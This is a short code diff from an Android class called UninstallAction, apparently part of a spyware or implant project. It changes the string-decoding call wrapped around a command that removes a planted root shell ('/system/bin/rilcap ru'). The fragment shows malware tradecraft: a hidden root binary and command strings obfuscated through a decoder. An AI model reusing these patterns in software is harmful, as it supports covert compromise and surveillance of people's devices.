@@ -87,7 +87,7 @@ public class UninstallAction extends SubActionSlow {
 
 			try {
 				// /system/bin/ntpsvd ru (uninstall root shell)
-				localProcess = Runtime.getRuntime().exec(M.d("/system/bin/rilcap ru"));
+				localProcess = Runtime.getRuntime().exec(M.e("/system/bin/rilcap ru"));
 
 				localProcess.waitFor();
 			} catch (Exception e) {
